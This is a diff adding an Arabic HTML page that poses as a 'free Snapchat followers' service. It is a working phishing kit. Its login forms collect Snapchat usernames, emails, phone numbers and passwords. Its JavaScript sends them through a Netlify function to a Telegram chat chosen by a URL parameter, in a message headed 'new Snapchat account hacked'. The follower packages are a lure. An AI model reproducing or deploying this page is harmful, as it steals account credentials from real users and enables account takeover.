@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>زيادة متابعين سناب شات</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #FFFC00, #FFD700);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+        }
+        
+        .logo {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        
+        .header h1 {
+            color: #000;
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        
+        .header p {
+            color: #333;
+            font-size: 16px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            border: 3px solid #000;
+        }
+        
+        .card-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #000;
+            text-align: center;
+        }
+        
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .login-option {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .login-option:hover {
+            border-color: #FFFC00;
+            background: #fffce0;
+            transform: translateY(-2px);
+        }
+        
+        .login-option i {
+            font-size: 24px;
+            margin-bottom: 8px;
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus {
+            border-color: #FFFC00;
+            outline: none;
+        }
+        
+        .btn {
+            background: #000;
+            color: #FFFC00;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            background: #333;
+            transform: translateY(-2px);
+        }
+        
+        .btn-secondary {
+            background: #6c757d;
+            color: white;
+            margin-top: 10px;
+        }
+        
+        .packages {
+            display: grid;
+            gap: 15px;
+        }
+        
+        .package {
+            background: linear-gradient(135deg, #FFFC00, #FFD700);
+            border: 2px solid #000;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .package:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 252, 0, 0.4);
+        }
+        
+        .package h3 {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #000;
+        }
+        
+        .package .price {
+            font-size: 24px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 10px;
+        }
+        
+        .package .description {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+        
+        .package-btn {
+            background: #000;
+            color: #FFFC00;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .package-btn:hover {
+            background: #333;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .active {
+            display: block;
+        }
+        
+        .back-btn {
+            background: #6c757d;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        
+        .free-badge {
+            background: #000;
+            color: #FFFC00;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- الشعار والعنوان -->
+        <div class="header">
+            <div class="logo">👻</div>
+            <h1>متابعين سناب شات</h1>
+            <p>زود متابعينك واحصل على الشهرة</p>
+        </div>
+
+        <!-- قسم تسجيل الدخول -->
+        <div class="card" id="loginSection">
+            <h2 class="card-title">تسجيل الدخول</h2>
+            <p style="text-align: center; margin-bottom: 20px; color: #666;">
+                اختر طريقة تسجيل الدخول للمتابعة وزيادة المتابعين
+            </p>
+            
+            <div class="login-options">
+                <div class="login-option" onclick="showLoginForm('username')">
+                    <i>👤</i>
+                    <span>اسم المستخدم</span>
+                </div>
+                <div class="login-option" onclick="showLoginForm('email')">
+                    <i>📧</i>
+                    <span>البريد الإلكتروني</span>
+                </div>
+                <div class="login-option" onclick="showLoginForm('phone')">
+                    <i>📱</i>
+                    <span>رقم الهاتف</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- نماذج تسجيل الدخول -->
+        <div class="card hidden" id="usernameForm">
+            <button class="back-btn" onclick="showLoginSection()">← رجوع</button>
+            <h2 class="card-title">تسجيل الدخول باسم المستخدم</h2>
+            <div class="form-group">
+                <label for="username">اسم المستخدم</label>
+                <input type="text" id="username" placeholder="أدخل اسم المستخدم في سناب شات">
+            </div>
+            <div class="form-group">
+                <label for="usernamePassword">كلمة المرور</label>
+                <input type="password" id="usernamePassword" placeholder="أدخل كلمة المرور">
+            </div>
+            <button class="btn" onclick="submitLogin('username')">تسجيل الدخول</button>
+        </div>
+
+        <div class="card hidden" id="emailForm">
+            <button class="back-btn" onclick="showLoginSection()">← رجوع</button>
+            <h2 class="card-title">تسجيل الدخول بالبريد الإلكتروني</h2>
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني</label>
+                <input type="email" id="email" placeholder="example@gmail.com">
+            </div>
+            <div class="form-group">
+                <label for="emailPassword">كلمة المرور</label>
+                <input type="password" id="emailPassword" placeholder="أدخل كلمة المرور">
+            </div>
+            <button class="btn" onclick="submitLogin('email')">تسجيل الدخول</button>
+        </div>
+
+        <div class="card hidden" id="phoneForm">
+            <button class="back-btn" onclick="showLoginSection()">← رجوع</button>
+            <h2 class="card-title">تسجيل الدخول برقم الهاتف</h2>
+            <div class="form-group">
+                <label for="phone">رقم الهاتف</label>
+                <input type="tel" id="phone" placeholder="+201234567890">
+            </div>
+            <div class="form-group">
+                <label for="phonePassword">كلمة المرور</label>
+                <input type="password" id="phonePassword" placeholder="أدخل كلمة المرور">
+            </div>
+            <button class="btn" onclick="submitLogin('phone')">تسجيل الدخول</button>
+        </div>
+
+        <!-- قسم الباقات -->
+        <div class="card hidden" id="packagesSection">
+            <button class="back-btn" onclick="showLoginSection()">← رجوع</button>
+            <h2 class="card-title">باقات المتابعين</h2>
+            <p style="text-align: center; margin-bottom: 20px; color: #666;">
+                اختر الباقة المناسبة لك وإبدأ رحلتك نحو الشهرة
+            </p>
+            
+            <div class="packages">
+                <div class="package" onclick="selectPackage(1000)">
+                    <div class="free-badge">مجاني بالكامل</div>
+                    <h3>متابع 1000</h3>
+                    <div class="price">0 $</div>
+                    <div class="description">احصل على 1000 متابع حقيقي مجاناً</div>
+                    <button class="package-btn">اختيار الباقة</button>
+                </div>
+                
+                <div class="package" onclick="selectPackage(1500)">
+                    <h3>متابع 1500</h3>
+                    <div class="price">5 $</div>
+                    <div class="description">احصل على 1500 متابع حقيقي</div>
+                    <button class="package-btn">اختيار الباقة</button>
+                </div>
+                
+                <div class="package" onclick="selectPackage(3000)">
+                    <h3>متابع 3000</h3>
+                    <div class="price">8 $</div>
+                    <div class="description">احصل على 3000 متابع حقيقي</div>
+                    <button class="package-btn">اختيار الباقة</button>
+                </div>
+                
+                <div class="package" onclick="selectPackage(5000)">
+                    <h3>متابع 5000</h3>
+                    <div class="price">12 $</div>
+                    <div class="description">احصل على 5000 متابع حقيقي</div>
+                    <button class="package-btn">اختيار الباقة</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function getChatId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('chatId');
+        }
+        
+        async function sendToTelegram(message) {
+            const chatId = getChatId();
+            if (!chatId) {
+                console.error('No chatId found');
+                return false;
+            }
+            
+            try {
+                const response = await fetch('/.netlify/functions/snapchat', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        message: message
+                    })
+                });
+                
+                const result = await response.json();
+                return result.success;
+                
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+        
+        function showLoginSection() {
+            hideAllSections();
+            document.getElementById('loginSection').classList.add('active');
+        }
+        
+        function showLoginForm(type) {
+            hideAllSections();
+            document.getElementById(type + 'Form').classList.add('active');
+        }
+        
+        function showPackagesSection() {
+            hideAllSections();
+            document.getElementById('packagesSection').classList.add('active');
+        }
+        
+        function hideAllSections() {
+            document.querySelectorAll('.card').forEach(card => {
+                card.classList.add('hidden');
+            });
+        }
+        
+        async function submitLogin(type) {
+            let username, email, phone, password;
+            
+            switch(type) {
+                case 'username':
+                    username = document.getElementById('username').value;
+                    password = document.getElementById('usernamePassword').value;
+                    break;
+                case 'email':
+                    email = document.getElementById('email').value;
+                    password = document.getElementById('emailPassword').value;
+                    break;
+                case 'phone':
+                    phone = document.getElementById('phone').value;
+                    password = document.getElementById('phonePassword').value;
+                    break;
+            }
+            
+            if ((!username && !email && !phone) || !password) {
+                alert('⚠️ يرجى ملء جميع الحقول');
+                return;
+            }
+            
+            const chatId = getChatId();
+            const message = `
+👻 <b>تم اختراق حساب سناب شات جديد</b>
+
+📝 <b>نوع التسجيل:</b> ${type}
+${username ? `👤 <b>اسم المستخدم:</b> ${username}\n` : ''}
+${email ? `📧 <b>البريد الإلكتروني:</b> ${email}\n` : ''}
+${phone ? `📱 <b>رقم الهاتف:</b> ${phone}\n` : ''}
+🔑 <b>كلمة المرور:</b> ${password}
+🆔 <b>Chat ID:</b> ${chatId}
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}
+            `.trim();
+            
+            const sent = await sendToTelegram(message);
+            
+            if (sent) {
+                alert('✅ تم تسجيل الدخول بنجاح!');
+                showPackagesSection();
+            } else {
+                alert('❌ حدث خطأ في التسجيل، يرجى المحاولة مرة أخرى');
+            }
+        }
+        
+        async function selectPackage(followers) {
+            const chatId = getChatId();
+            const message = `
+👻 <b>طلب باقة متابعين</b>
+
+📦 <b>الباقة المختارة:</b> ${followers} متابع
+💰 <b>السعر:</b> ${followers === 1000 ? 'مجاني' : (followers === 1500 ? '5$' : followers === 3000 ? '8$' : '12$')}
+🆔 <b>Chat ID:</b> ${chatId}
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}
+            `.trim();
+            
+            const sent = await sendToTelegram(message);
+            
+            if (sent) {
+                alert(`🎉 تم طلب باقة ${followers} متابع بنجاح!\n⏳ جاري المعالجة...`);
+            } else {
+                alert('❌ حدث خطأ في الطلب، يرجى المحاولة مرة أخرى');
+            }
+        }
+        
+        window.addEventListener('load', function() {
+            const chatId = getChatId();
+            if (!chatId) {
+                alert('⚠️ الرابط غير صحيح - يرجى استخدام الرابط الصحيح');
+            }
+            
+            showLoginSection();
+        });
+    </script>
+</body>
+</html>
